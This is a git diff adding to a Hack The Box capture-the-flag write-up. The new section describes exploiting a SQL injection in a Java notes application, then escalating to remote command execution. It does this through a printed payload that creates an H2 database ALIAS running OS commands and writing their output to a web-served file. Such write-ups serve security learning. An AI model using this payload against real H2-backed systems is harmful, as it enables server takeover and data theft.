@@ -5,6 +5,9 @@ Write-up Web Challenge Hack The Box
 [CDNio](#cdnio)
 
 [Pentest Notes](#pentest-notes)
+
+[Pentest Notes](#insomnia)
+
 ## <a name="cdnio"></a> 	:triangular_flag_on_post: CDNio
 Overview of the site have features: 
 - register a new account with username, password, email
@@ -79,4 +82,45 @@ Audit source, in `NotesController.java` param `name` insert to query
 
 ![image](https://github.com/user-attachments/assets/381adc91-3d7d-46de-b204-c04a1685701f)
 
-This is SQL Injection vulnerability, we can insert query to leak data in database
+This is SQL Injection vulnerability, we can insert query to leak data in database. 
+
+Test the above hypothesis
+
+![image](https://github.com/user-attachments/assets/14f2f8e5-67d0-4e0f-a92e-504e3840cf2e)
+
+So, this web have SQL Injection, i will see schema of database to get data like table name, user. However, just NOTES table can access by query, and other tables can't get data
+
+![image](https://github.com/user-attachments/assets/fa835a5e-9d5c-48b8-8aad-1e63cd9e6a6d)
+
+Like table `TABLE_PRIVILEGES` i select to column in table but response 500. 
+File pom.xml in source code, a dependency is h2.database, that mean this challenge use H2 database. I tried search [vulnerability about H2 DB](https://www.exploit-db.com/exploits/45506). This vulnerability about feature of database, build a ALIAS with java code to run shell in server. So, we can run java code via feature ALIAS of H2 database
+
+I'm tried this payload, and we can pass parameter OS Command to RCE
+``` java
+SQL Injection' OR 1=0; CREATE ALIAS RCE AS '
+    String execve(String cmd) throws java.io.IOException { 
+        Process process = Runtime.getRuntime().exec(cmd); 
+        java.io.InputStream inputStream = process.getInputStream(); 
+        java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream("/app/target/classes/static/hola.html");
+        byte[] buffer = new byte[1024]; 
+        int bytesRead; 
+        while ((bytesRead = inputStream.read(buffer)) != -1) { 
+            fileOutputStream.write(buffer, 0, bytesRead);
+        } 
+        fileOutputStream.close(); 
+        inputStream.close(); 
+        return "Output written to /app/target/classes/static/hola.html";
+    }'; -- -
+```
+
+![image](https://github.com/user-attachments/assets/c7e0a44d-60bf-4fab-b857-82f2954d36c5)
+
+And now, we can call ALIAS and pass OS Command
+
+![image](https://github.com/user-attachments/assets/7994e97e-d112-4f69-8654-3c9d11e6888e)
+
+![image](https://github.com/user-attachments/assets/edd7398a-a39a-43c0-863d-679ba74b0aa5)
+
+![image](https://github.com/user-attachments/assets/56e60c11-77ea-442c-a851-fb6e98c0d76b)
+
+## <a name="insomnia"></a> 	:triangular_flag_on_post: Insomnia
